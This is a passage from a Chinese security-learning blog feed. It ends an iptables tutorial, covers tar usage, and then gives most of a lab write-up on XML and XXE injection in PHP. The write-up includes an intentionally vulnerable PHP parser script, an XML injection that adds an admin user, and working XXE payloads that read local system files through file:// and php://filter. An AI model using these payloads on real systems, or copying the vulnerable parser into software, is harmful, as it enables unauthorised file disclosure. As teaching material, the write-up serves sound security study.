packets表示默认策略匹配到0个包。</p><p><strong>bytes</strong>表示当前链默认策略匹配到的所有包的大小总和。</p><p>其实，我们可以把packets与bytes称作”计数器”，上图中的计数器记录了默认策略匹配到的报文数量与总大小，”计数器”只会在使用-v选项时，才会显示出来。</p><p>当被匹配到的包达到一定数量时，计数器会自动将匹配到的包的大小转换为可读性较高的单位。如果想要查看精确的计数值，可以使用-x参数。</p><p>可以使用如下命令来修改默认规则（可以尝试修改其他链的默认规则，修改INPUT的默认规则，可能导致远程连接的断开）：</p><pre><code>iptables -P INPUT DROP //将filter表的INPUT链的默认规则更改为DROP</code></pre><h3 id="iptables参数解释"><a href="#iptables参数解释" class="headerlink" title="iptables参数解释"></a>iptables参数解释</h3><p>现在开始详细了解iptables的语法和部分参数。</p><p>使用man命令查看帮助信息：</p><p><img src="/../image/image-20240531165843715.png" alt="image-20240531165843715"></p><p>如上图，使用man命令查看之后，列出了iptables的大多数参数的使用示例。可总结出iptables的使用语法：</p><p>格式：iptables [-t 表名] COMMAND 链名 [规则序号] 匹配条件 -j 执行操作</p><pre><code>[-t 表名]： 表示该项可省略，省略该参数的情况下，默认是对filter表进行操作。COMMAND：要执行的命令，比如添加、删除、修改、替换规则。[规则序号]：规则序号就是对该链下的第几条规则进行操作，如果省略的话，默认是对最后一条规则进行操作。匹配条件： 对什么样的数据包进行匹配执行操作： 对匹配到的数据包执行的操作，比如ACCEPT（接受）、DROP（丢弃）、REJECT（拒绝）</code></pre><p>接下来我们详细介绍部分COMMAND常用参数的作用，如下图</p><p>例如： -A 表示短项，–append表示长项，使用的时候选其一即可。</p><pre><code>-A --append 链名 ：在指定的链中追加规则，一般是在末尾追加。-I --insert 链名 [规则序号num]：在指定的链中插入规则，默认是在首部插入，可指定位置。-D --delete 链名 [规则序号num]：删除指定链中的指定规则，默认是删除最后一个，可指定位置。-R --replace 链名 [规则序号num]：替换规则，可指定位置。-F --flush [链名] ：清除指定链中的规则，如果没有指定链名的话，则默认是清除指定表中的所有链下的规则。-N --new-chain 链名：除自有的5条链之外，还可使用该参数创建新的链。-X --delete-chain 链名：删除自定义的链。但是链必须是在空链的状态下。-Z --zero 链名：将指定链的计数器置零。-P --policy 链名：修改指定链的默认策略。-L --list ：显示iptables中的规则列表。这个参数，我们在上面的章节中已经接触过了，它还有几个可以结合使用的参数：  -n ： 使用数字显示，如果不加该参数，iptables会将数字反解为服务名，当规则数量较多时，会影响iptables的效率，速度会变慢，所以一般情况下要添加该参数。  -v ： 显示规则的详细信息，包阔每一个规则的计数器。  --line：显示规则的时候，在规则的前面显示序号。</code></pre><p>那么上面的是COMMAND部分的常用参数，那么在匹配条件部分也有一些常用的参数：</p><pre><code>-p --protocol 协议：指定需要匹配的目标协议，比如tcp、icmp、http等-s --source 地址：指定需要匹配的源地址-d --destination 地址：指定需要匹配的目标地址-i --in-interface 名称：指定网络流量包流入的网卡，即对流入该网卡的流量包进行匹配-o --out-interface 名称：指定网络流量包流出的网卡，即对流出该网卡的流量包进行匹配</code></pre><p>我们可以使用几个例子来练习一下这些参数的使用：</p><p>假设我们现在要进行的规则匹配，是其他主机对防火墙本机的请求流量，所以我们需要对INPUT链进行规则的添加：</p><p>我们先查看INPUT现有的规则：</p><pre><code>iptables -L INPUT -n --line</code></pre><p>假设我们现在要禁止别的主机对本机进行ping探测，所以要配置一个icmp协议相关的规则，并且其采用的处理方式是拒绝。</p><p>所以我们看上图中的规则，发现第二条规则是跟icmp协议相关的规则，但是其处理方式是ACCEPT接受。这样的话，如果有ping探测包到达本机的时候，进行规则的匹配，等匹配到第二条规则的时候，就会直接通过，不会再匹配到我们新的规则。</p><p>我们可以做如下测试：</p><p>先添加规则：</p><pre><code>iptables -A INPUT -p icmp -s 192.168.0.4 -j DROP</code></pre><p>查看规则，可以看见现在有两条跟icmp相关的规则（此处的情况在不同人的实验环境中，可能会有不同）：</p><p>然后我们使用kali对本机进行ping探测：</p><p>发现可以正常探测，说明我们刚刚添加的拒绝规则没有起到效果。我们删除第二条规则：</p><pre><code>iptables -D INPUT 2</code></pre><p>发现可以正常探测，说明我们刚刚添加的拒绝规则没有起到效果。我们删除第二条规则：</p><p><img src="/../image/image-20240531170806691.png" alt="image-20240531170806691"></p><p><img src="/../image/image-20240531170810715.png" alt="image-20240531170810715"></p><p>清空规则，只是清空了系统加载在内存中的规则，并没有保存。所以如果要使添加的规则不在重启后消失，需要保存。</p><p>可以使用如下命令进行保存</p><pre><code>service iptables save  或者 iptables-save &gt; /etc/sysconfig/iptables</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> iptables </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux-tar</title>
      <link href="/2024/05/30/linux-tar/"/>
      <url>/2024/05/30/linux-tar/</url>
      
        <content type="html"><![CDATA[<p>附文：<a href="https://blog.csdn.net/qq_43657810/article/details/132328941">https://blog.csdn.net/qq_43657810/article/details/132328941</a></p><p><a href="https://blog.csdn.net/qq_16268979/article/details/127780124">https://blog.csdn.net/qq_16268979/article/details/127780124</a></p><p><strong>1、创建归档文件：</strong>将文件 file1、file2 和 directory 打包到一个名为 archive.tar 的归档文件中。</p><pre><code>tar -cvf archive.tar file1 file2 directory</code></pre><ul><li><code>-c</code>: 创建新的归档文件</li><li><code>-v</code>: 显示详细输出，列出被添加到归档中的文件</li><li><code>-f</code>: 指定归档文件的名称</li></ul><p><strong>2、解压归档文件：</strong>解压名为 archive.tar 的归档文件，还原其中包含的文件和目录。</p><pre><code>tar -xvf archive.tar</code></pre><ul><li><code>-x</code>: 解压归档文件</li><li><code>-v</code>: 显示详细输出，列出被解压的文件</li><li><code>-f</code>: 指定要解压的归档文件的名称</li></ul><p><strong>3、压缩归档文件：</strong>将名为 directory 的目录打包成一个归档文件，然后使用 gzip 进行压缩，生成名为 archive.tar.gz 的文件。</p><ul><li><code>-c</code>: 创建新的归档文件</li><li><code>-z</code>: 使用 gzip 压缩归档文件</li><li><code>-v</code>: 显示详细输出，列出被添加到归档中的文件</li><li><code>-f</code>: 指定归档文件的名称</li></ul><h3 id="指定压缩格式"><a href="#指定压缩格式" class="headerlink" title="指定压缩格式"></a>指定压缩格式</h3><p>tar 可以结合不同的压缩程序来创建和解压压缩归档文件。</p><p><strong>z</strong> : 使用 gzip 压缩。</p><pre><code>tar -czvf archive.tar.gz directorytar -xzvf archive.tar.gz</code></pre><p><strong>j</strong>: 使用 bzip2 压缩。</p><pre><code>tar -cjvf archive.tar.bz2 directorytar -xjvf archive.tar.bz2</code></pre><p><strong>J</strong>: 使用 xz 压缩。</p><pre><code>tar -cJvf archive.tar.xz directorytar -xJvf archive.tar.xz</code></pre><p>补充：</p><p>有一堆文件来自两个tar文件，怎么单独删除来自某个文件的解压文件，可以利用xargs</p><pre><code class="console">[youzipii@localhost tar_test]$ tar -tvf odd.tar-rw-rw-r-- youzipii/youzipii 10240 2024-05-30 20:53 file1-rw-rw-r-- youzipii/youzipii     0 2024-05-30 20:26 file3-rw-rw-r-- youzipii/youzipii     0 2024-05-30 20:26 file5[youzipii@localhost tar_test]$ tar -tvf even.tar-rw-rw-r-- youzipii/youzipii 0 2024-05-30 20:58 file0-rw-rw-r-- youzipii/youzipii 0 2024-05-30 20:58 file2-rw-rw-r-- youzipii/youzipii 0 2024-05-30 20:58 file4[youzipii@localhost tar_test]$ lseven.tar  file0  file1  file2  file3  file4  file5  odd.tar</code></pre><pre><code>tar -tf odd.tar | xargs rm -f</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP的xml外部实体注入</title>
      <link href="/2024/05/30/PHP%E7%9A%84xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/05/30/PHP%E7%9A%84xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="php的xml外部实体注入"><a href="#php的xml外部实体注入" class="headerlink" title="php的xml外部实体注入"></a>php的xml外部实体注入</h1><h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 <a href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a>、 <a href="https://www.php.net/manual/zh/function.copy.php">copy()</a>、 <a href="https://www.php.net/manual/zh/function.file-exists.php">file_exists()</a> 和 <a href="https://www.php.net/manual/zh/function.filesize.php">filesize()</a> 的文件系统函数。 除了这些封装协议，还能通过 <a href="https://www.php.net/manual/zh/function.stream-wrapper-register.php">stream_wrapper_register()</a> 来注册自定义的封装协议。</p><pre><code>file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流</code></pre><p>想要了解更详细的信息，可以访问php的官方文档：</p><p><a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p><h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a><strong>什么是XML</strong></h2><p>eXtensible Markup Language,可扩展标记语言，使用简单的标记来描述数据。是一种非常灵活的语言,类似于HTML语言，但是并没有固定的标签，所有的标签都可以自定义，其设计的宗旨是传输数据，而不是像HTML一样显示数据。xml不会做任何事情，它是被设计用来结构化、存储以及传输信息，也就是xml文件所携带的信息，需要被其他的语言或者程序来解析，才能发挥作用。</p><h2 id="XML的用处"><a href="#XML的用处" class="headerlink" title="XML的用处"></a><strong>XML的用处</strong></h2><p>通常，xml被用于信息的记录和传递(比如，数据库的导出导入会很麻烦，但是xml会很方便)，也会被用于充当配置文件。也会被应用于Web 开发的许多方面，常用于简化数据的存储和共享。如：</p><pre><code>a&gt; XML 把数据从 HTML 分离，更方便再HTML文档中显示动态数据。b&gt; XML 简化数据共享，XML 数据以纯文本格式进行存储，因此提供了一种独立于软件和硬件的数据存储方法。这让创建不同应用程序可以共享的数据变得更加容易。c&gt; XML 简化数据传输，由于可以通过各种不兼容的应用程序来读取数据，以 XML 交换数据降低了不兼容系统之间交换书据的复杂性。d&gt; XML 简化平台变更，使用XML存储一些不兼容的数据，可以在系统或软件升级，转换大量的数据时，避免数据的丢失。e&gt; XML 使您的数据更有用，XML可以使不同的应用程序都能够访问您的数据，使得数据的用途更广。f&gt; XML 用于创建新的互联网语言，如XHTML、WSDL、WAP 和 WML、RSS 、RDF 和 OWL等</code></pre><h2 id="什么是XML注入"><a href="#什么是XML注入" class="headerlink" title="什么是XML注入"></a><strong>什么是XML注入</strong></h2><p>比如：一个 web 应用，使用进行用户注册时，选择以 xml 来存储数据到 xmldb 数据库中，当用户填写用户名，密码和邮箱时，后台存储的文件格式及内容如下：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding:=&quot;UTF-8&quot;?&gt;&lt;Users&gt;    &lt;user&gt;        &lt;user_name&gt;admin&lt;/user_name&gt;        &lt;user_pass&gt;111111&lt;/user_pass&gt;        &lt;user_email&gt;admin@test.com&lt;/user_email&gt;    &lt;/user&gt;&lt;/Users&gt;</code></pre><p>那么攻击者就可以在注册的时候构造恶意的数据，假设他在用户名与密码的输入框中输入正常的文本，在最后的邮箱输入框中输入如下内容：</p><pre><code class="xml">&lt;/user_email&gt;&lt;user&gt;&lt;user_name&gt;admin1&lt;/user_name&gt;&lt;user_pass&gt;111111&lt;/user_pass&gt;&lt;user_email&gt;admin1@test.com&lt;/user_email&gt;&lt;/user&gt;</code></pre><p>我们看一看这段恶意的输入内容，先是把第一个注册的用户邮箱标签闭合，然后把用户标签闭合，再新建一个完整的用户标签，最后再把最后的没有任何内容的用户标签闭合，那么当这段内容到达xmldb数据中时，就会多注册一个名为admin1的用户。</p><p>综合上面的小例子，我么可以知道,能够进行XML注入攻击的前提是，用户能够控制数据的输入，程序没有对输入的内容进行过滤且拼接了数据。那么相应的，破坏掉其中一个前提就可以进行防御了，既然我们无法限制用户的输入，那么就可以对数据进行过滤，将XML语言本身的“保留字符”进行过滤或者转意即可。</p><h2 id="什么是XXE注入漏洞："><a href="#什么是XXE注入漏洞：" class="headerlink" title="什么是XXE注入漏洞："></a><strong>什么是XXE注入漏洞：</strong></h2><p>XXE注入也是XML注入的一部分，但相较于普通的XML注入，XXE注入的攻击面更广，危害更大。</p><p><strong>XXE注入</strong>(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，所注入的对象就是XML语言中的一个的重点： XML外部实体。当遇见能够解析XML内容的页面时，如果能注入外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面。</p><p>XXE的攻击形式主要分为：带内数据实体注入、基于错误的实体注入和带外数据实体注入</p><pre><code>带内数据实体注入：in-band ,XML解析后的数据会直接显示在屏幕上基于错误的实体注入：error-based，解析结果只有一大堆的错误带外数据实体注入：out-of-band，也叫XXE盲注，注入的XML解析后无任何输出响应，必须执行一些带外请求吧数据提取出来。</code></pre><h2 id="XXE注入能做什么："><a href="#XXE注入能做什么：" class="headerlink" title="XXE注入能做什么："></a><strong>XXE注入能做什么：</strong></h2><p>a&gt; 任意文件读（本实验重点）</p><p>b&gt; SSRF，服务端请求伪造，借助漏洞实现内网探测，比如内网的存活主机、开放端口等</p><p>c&gt; DOS攻击</p><p>d&gt; 远程命令执行</p><h2 id="PHP的XXE注入产生的条件"><a href="#PHP的XXE注入产生的条件" class="headerlink" title="PHP的XXE注入产生的条件"></a><strong>PHP的XXE注入产生的条件</strong></h2><p>a&gt; Libxml的版本尽可能的低，libxml是PHP的xml解析库，因为从2.8.0版本开始，libxml默认是不加载外部实体的，如果要使用较高版本的libxml的话，需要在编写代码的时候对参数做设置。</p><p>b&gt; 目标主机没有禁用外部实体的引用。</p><p>c&gt; 用户可以控制xml的输入内容</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>系统类型： Windows7_x64</p><p>IP地址： 192.168.0.3</p><p>所用软件： phpstudy、BurpSuite、ncat</p><p>实验内容主要分为四个部分：</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>1． XML基础必备</p><p>2． 有回显的本地文件读取（In-band 带内数据实体注入）。</p><p>3． 无回显的本地文件读取（OOB out-of-band 外带参数实体注入）。</p><p>4． PHP中的XXE注入漏洞的其他利用方式</p><h3 id="XML基础必备"><a href="#XML基础必备" class="headerlink" title="XML基础必备"></a>XML基础必备</h3><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding:=&quot;UTF-8&quot;?&gt;&lt;Users&gt;    &lt;user&gt;        &lt;user_name&gt;admin&lt;/user_name&gt;        &lt;user_pass&gt;111111&lt;/user_pass&gt;        &lt;user_email&gt;admin@test.com&lt;/user_email&gt;    &lt;/user&gt;&lt;/Users&gt;</code></pre><p>如上代码，第一行是XML文档的声明，由“<?xml”开头，以“?>”结尾，其中的内容是对本xml文档所使用的版本 “version”和编码“encoding”的声明，version一般情况下都是1.0，因为目前为止，xml只有这一个版本。</p><p>从第三行开始，就是XML文档的主要内容了，如代码中所示的“<Users>”，是本文档的根元素，“<user>”是“<Users>”的子元素，而“<user_name>、<user_pass>、<user_email>”也都是子元素，但是是“<book>”的子元素。</p><h4 id="XML的格式"><a href="#XML的格式" class="headerlink" title="XML的格式"></a><strong>XML的格式</strong></h4><p>a&gt;. 声明信息，用于描述xml的版本及编码格式。**<?**xml version="1.0" encoding="utf-8" **?>**</p><p>b&gt;. xml有且仅有一个根元素（可以理解为顶级的元素、没有被其他元素包起来的元素）。</p><p>c&gt;. xml中大小写敏感</p><p>d&gt;. 标签是成对出现的，所有元素都必须有一个关闭标签，而且要正确嵌套。</p><p>e&gt;. 属性值要使用双引号,比如某标签有个id属性，那么id的值需要使用双引号</p><p>f&gt;. 注释的写法。</p><pre><code class="xml">&lt;!--1--&gt;</code></pre><p>g&gt;. 一个格式良好的xml文件</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;books&gt;    &lt;book id=&quot;b01&quot;&gt;        &lt;name&gt;Python黑客编程从入门到入狱&lt;/name&gt;        &lt;author&gt;张三&lt;/author&gt;        &lt;price&gt;$20.00&lt;/price&gt;    &lt;/book&gt;&lt;/books&gt;</code></pre><p>h&gt;. XML并不是让用户直接打开的，而是让别的语言来从文件中读取信息的。至于为什么可以直接用浏览器浏览，只是部分浏览器可以识别而已。</p><h4 id="XML的属性"><a href="#XML的属性" class="headerlink" title="XML的属性"></a><strong>XML的属性</strong></h4><p>虽然XML像HTML一样，也有属性，但是一般不推荐使用属性，如果某个信息看起来很像是数据，那么最好是使用元素来表示它，而不是属性。</p><h4 id="XML验证"><a href="#XML验证" class="headerlink" title="XML验证"></a><strong>XML验证</strong></h4><p>拥有正确语法的 XML 被称为”形式良好”的 XML。而判断XML的语法是否合法，叫做XML验证，是通过 DTD进行验证的。</p><p>DTD：Document Type Definition 文档类型定义。用于约束xml的文档格式，保证xml是一个有效的xml，DTD分为内部和外部两种。DTD定义在xml文件中视为内部DTD；DTD定义在外部的dtd文件中，视为外部DTD。</p><p>说的简单一点，DTD就是对当前的XML文档定义一些规则，比如这个XML文档中的根元素是什么，有几个子元素，每个子元素能出现几次，哪些元素有属性，属性的类型是什么，属性的默认值是什么等等，如果后面的XML内容中，与DTD中的定以不符，如元素个数不符、元素名称大小写不符等，那么XML文件解析时就会报错。</p><h4 id="内部DTD的使用："><a href="#内部DTD的使用：" class="headerlink" title="内部DTD的使用："></a><strong>内部DTD的使用：</strong></h4><h5 id="内部DTD的定义"><a href="#内部DTD的定义" class="headerlink" title="内部DTD的定义"></a><strong>内部DTD的定义</strong></h5><pre><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></pre><h5 id="元素声明语法"><a href="#元素声明语法" class="headerlink" title="元素声明语法"></a><strong>元素声明语法</strong></h5><pre><code>[&lt;!ELEMENT 根元素 (子元素)&gt;&lt;!ELEMENT 根元素的子元素 (子元素的子元素，子元素的子元素)&gt;&lt;!ELEMENT 子元素 (数据类型)&gt;&lt;!ELEMENT 子元素 (数据类型)&gt;]</code></pre><h5 id="元素声明中的数量词"><a href="#元素声明中的数量词" class="headerlink" title="元素声明中的数量词"></a><strong>元素声明中的数量词</strong></h5><pre><code>&quot;+&quot; 表示出现一次或者多次&quot;?&quot;表示出现0次或多次&quot;*&quot;表示出现任意次。</code></pre><h5 id="属性声明语法"><a href="#属性声明语法" class="headerlink" title="属性声明语法"></a><strong>属性声明语法</strong></h5><pre><code>&lt;!ATTLIST 元素名称 属性名称  属性类型 默认值&gt;</code></pre><pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!--注释--&gt;&lt;!DOCTYPE books [    &lt;!ELEMENT books (book+)&gt;    &lt;!ELEMENT book (name,author price)&gt;    &lt;!ATTLIST book id CDATA #REQUIRED&gt;    &lt;!ELEMENT name (#PCDATA)&gt;    &lt;!ELEMENT author (#PCDATA)&gt;    &lt;!ELEMENT price (#PCDATA)&gt;]&gt;&lt;books&gt;    &lt;book id=&quot;b01&quot;&gt;        &lt;name&gt;a&lt;/name&gt;        &lt;author&gt;张三&lt;/author&gt;        &lt;price&gt;$1.00&lt;/price&gt;    &lt;/book&gt;&lt;/books&gt;</code></pre><p>如上，就是一个内部DTD的引用示例，在DTD定义中，要求根元素books的子元素book出现一次及以上，子元素book又有三个子元素，分别为name，author和price，然后声明了元素book的id属性，其类型时CDATA，并且是必须的（#REQUIRED），最后定义了book的三个子元素的数据类型为#PCDATA，这表示这三个元素标签中的内容必须为文本，不能再出现子标签。</p><h4 id="外部DTD的使用："><a href="#外部DTD的使用：" class="headerlink" title="外部DTD的使用："></a><strong>外部DTD的使用：</strong></h4><p>首先需要创建一个外部的dtd文件。内容中不需要包括&lt;!DOCTYPE…&gt;，直接&lt;!ELEMENT…&gt;，如下所示：</p><pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!ELEMENT books (book+)&gt;&lt;!ELEMENT book ( name,author,price)&gt;&lt;!ATTLIST book id CDATA #REQUIRED&gt;&lt;!ELEMENT name (#PCDATA)&gt;&lt;!ELEMENT author (#PCDATA)&gt;&lt;!ELEMENT price (#PCDATA)&gt;</code></pre><p>然后在XML文档中引入外部的DTD：</p><!DOCTYPE books SYSTEM "xxx.dtd"><p>注意外部实体引用时的关键字“SYSTEM”，同时也可以使用“PUBLIC”这个关键字，这两者的区别在于，SYSTEM表示私有的DTD，PUBLIC表示共有的DTD。</p><h4 id="DTD实体（重点学习）"><a href="#DTD实体（重点学习）" class="headerlink" title="DTD实体（重点学习）"></a><strong>DTD实体（重点学习）</strong></h4><p>首先，什么是DTD实体，简单点理解，实体就像是变量，可以用于存储数据，以便后续的使用。但它的功能又不仅仅是存储，比如外部实体，除了可以存储数据，还可以从远程文件或远程网络中读取内容或调用数据。</p><p>从实体被定义的位置来看，实体可以分为内部实体和外部实体，就像内部DTD和外部DTD一样，内部实体，就是在XML文档内部的DTD进行定义的实体，外部实体就是定义在外部DTD文件中然后被引用到当前XML中的实体。</p><p><strong>内部实体声明：</strong></p><p><strong>声明语法：</strong></p><!ENTITY 实体名称 "实体的值"><p>一个实体的引用，由三部分构成:&amp;符号, 实体名称, 分号。</p><p><strong>内部实体引用示例：</strong></p><p>我们可以在桌面上创建一个test.xml文件，将如下内容输入到文件中：</p><pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE Test [    &lt;!ENTITY test &quot;Hello World&quot;&gt;]&gt; &lt;Test&gt;&amp;test;&lt;/Test&gt;</code></pre><p><img src="/../image/image-20240530102946971.png" alt="image-20240530102946971"></p><p>接下来我们使用PHP进行解析：</p><p>打开phpstudy的www目录,然后在该路径下新建一个php文件getxml.php（实验环境中已经创建好，在桌面demo&#x2F;PHP_XML&#x2F;step1下，getxml.php），将如下代码输入进去：</p><pre><code class="php">&lt;?phplibxml_disable_entity_loader(false);$xml = simplexml_load_string($_GET[&#39;xml&#39;]);echo &quot;&lt;pre&gt;&quot;;print_r($xml);echo &quot;&lt;/pre&gt;&quot;;?&gt;</code></pre><p>使用浏览器进行访问getxml.php.直接访问可能会有报错，可能是因为我们还没有输入参数,然后我们将将前面的xml代码作为参数传入，可以不复制xml声明，<strong>记得要将引用实体时的“&amp;”手动编码为“%26”</strong>（因为我们这里使用的是GET传参的方式，所以传入的内容会被进行URL编码，但是&amp;在URL中被认为是两个参数的分隔符，所以如果我们不对其进行URL编码转换，浏览器会把它当作参数的分隔符来处理）：</p><p><img src="/../image/image-20240530103234742.png" alt="image-20240530103234742"></p><p><strong>外部实体声明：</strong></p><p><strong>声明语法：</strong></p><!ENTITY 实体名称 SYSTEM "URI/URL"><p>声明一个外部实体的关键在于“SYSTEM”这个关键字。SYSTEM在此意图让xml解析器知道，现在声明的是一个外部实体，需要从后面的外部资源中获取内容并存储在内部实体，如果后面的外部资源的语法，存在特殊符号，那么xml解析器会报错。</p><p>外部实体引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，比如http、file、ftp等，具体内容如下所示：</p><p><img src="/../image/image-20240530103307148.png" alt="image-20240530103307148"></p><p><strong>外部实体引用示例：</strong></p><p>实验环境中已经创建好以下文件，在桌面demo&#x2F;PHP_XML&#x2F;step1下，test2.xml</p><pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE Test [    &lt;!ENTITY xxe SYSTEM &quot;http://192.168.0.3/out_test.txt&quot;&gt;]&gt; &lt;Test&gt;&amp;xxe;&lt;/Test&gt;</code></pre><p>我们可以看到，代码中引入了一个外部实体文件out_test.txt，意思就是将远程主机“<a href="http://192.168.0.3/%E2%80%9D%E7%9A%84out_test.txt%E7%9A%84%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E8%B5%8B%E5%80%BC%E7%BB%99%E5%AE%9E%E4%BD%93xxe%E3%80%82%E6%88%91%E4%BB%AC%E5%85%88%E5%9C%A8www%E7%9B%AE%E5%BD%95%E4%B8%8B%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAout_test.txt,%E5%90%8E%E9%9A%8F%E4%BE%BF%E5%86%99%E5%85%A5%E7%82%B9%E5%86%85%E5%AE%B9%E3%80%82">http://192.168.0.3/”的out_test.txt的文件内容赋值给实体xxe。我们先在www目录下创建一个out_test.txt,后随便写入点内容。</a></p><pre><code>this is a text</code></pre><p>再次打开浏览器，访问getxml.php,将新的xml代码作为参数传入：</p><p><img src="/../image/image-20240530103454208.png" alt="image-20240530103454208"></p><p>另外，从实体的引用方式来区分，实体又可以分为：一般实体、参数实体、预定义实体。</p><pre><code>一般实体：General Entities，就是我们上面的示例中的实体，使用&amp;进行引用预定义实体：Predefined Entities，就是xml本身对一些特殊字符进行了预定义，方便用户直接引用，比如小于号&quot;&lt;&quot;，如果直接在xml文档中使用小于号，会被xml解析器视为标签，从而引起解析错误。那么此时就需要调用小于号所对应的预定义实体来引用：&lt;。参数实体：Parameter Entities，这也是XXE学习中的重点，在XXE利用中经常被使用。</code></pre><p><strong>参数实体</strong></p><p><strong>参数实体声明：</strong></p><pre><code>内部：&lt;!ENTITY % 实体名称 &quot;实体值&quot;&gt;外部：&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code></pre><p>参数实体应注意以下几点：</p><pre><code>(1) 使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 “%实体名;” 引用(2) 只有在 DTD 文件中，参数实体的声明才能引用其他实体(3) 和通用实体一样，参数实体也可以外部引用</code></pre><p>简单理解呢，就是参数实体不能像普通实体那样在xml文档内容中进行引用，它的引用范围只在当前xml文件的DTD声明中，或者是当前的DTD文件中。</p><p>参数实体引用示例（实验环境中已经创建好，在桌面demo&#x2F;PHP_XML&#x2F;step1下，test3.xml）：</p><pre><code class="xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!-- 参数实体 --&gt;&lt;!DOCTYPE Test [    &lt;!ENTITY  % par &quot;&lt;!ENTITY hello &#39;hello para entities&#39;&gt;&quot;&gt;    %par;]&gt;&lt;Test&gt;&amp;hello;&lt;/Test&gt;</code></pre><p>像上图这样一个xml文档，我们定义了一个参数实体为par，他的值比较特殊，是一句普通实体的声明，然后是在DTD中使用“%par;”进行引用，最后在xml文档内容中使用“&amp;hello”来引用定义的普通实体hello。所以这个时候，我们直接使用浏览器查看的时候，会是下面的显示：</p><p><img src="/../image/image-20240530111305856.png" alt="image-20240530111305856"></p><p>我们还是使用之前的getxml.php：</p><p>测试用的payload，也就是我们所要传的参数（记得在浏览器传参时将&amp;转义为%26）：</p><pre><code class="xml-dtd">&lt;!DOCTYPE root [   &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre><p>这是利用file协议来直接读取windows的系统配置文件，结果为：</p><p><img src="/../image/image-20240530112335516.png" alt="image-20240530112335516"></p><p>但是这样也不代表这个payload的就适用于任何情况，比如我们更换一个读取的文件xmlerror.txt，内容是</p><pre><code>&lt;this is a test&gt;&amp;&lt;##</code></pre><p>随便给他放个位置，我这里放在桌面上，我们再使用刚才的payload测试：</p><pre><code class="xml-dtd">&lt;!DOCTYPE root [   &lt;!ENTITY xxe SYSTEM &quot;file:///C:\Users\Administrator\Desktop\xmlerror.txt&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre><p>随便给他放个位置，我这里放在桌面上，我们再使用刚才的payload测试：</p><pre><code class="xml-dtd">&lt;!DOCTYPE root [   &lt;!ENTITY xxe SYSTEM &quot;file:///C:\Users\Administrator\Desktop\xmlerror.txt&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre><p><img src="/../image/image-20240530112606820.png" alt="image-20240530112606820"></p><p>这个时候就会如上图一样，报很多错误，主要是因为我们要读取的文件内容中存在很多的特殊字符：大于号、小于号等，我们在前面的XML基础中也提到过，当xml的标签内还存在小于号、大于号等特殊字符时，尤其是小于号，会被XML解析器误认为是另一个标签的开始，这样就会造成解析的错误。</p><p>所以我们就要想办法绕过。我们这里提供两种绕过办法：</p><pre><code>1. php伪协议2. XML CDATA</code></pre><p>我们先使用伪协议进行读取，使用的payload如下：</p><pre><code class="xml-dtd">&lt;!DOCTYPE root [   &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=C:/Users/Administrator/Desktop/xmlerror.txt&quot;&gt;]&gt;&lt;root&gt;%26xxe;&lt;/root&gt;#PHRoaXMgaXMgYSB0ZXN0PiY8IyM=</code></pre><p><img src="/../image/image-20240530112746123.png" alt="image-20240530112746123"></p><p><img src="/../image/image-20240530112824450.png" alt="image-20240530112824450"></p><p>进行base64解码后，就是文件的内容</p><p>接下来，我们利用CDATA进行内容的读取：</p><p>需要先了解一下XML CDATA，默认情况下，XML文档中的文本都会被XML解析器解析，但是会忽略CDATA区段中的文本。</p><p>我们看下W3school提供的CDATA使用方式：</p><p><img src="/../image/image-20240530113037168.png" 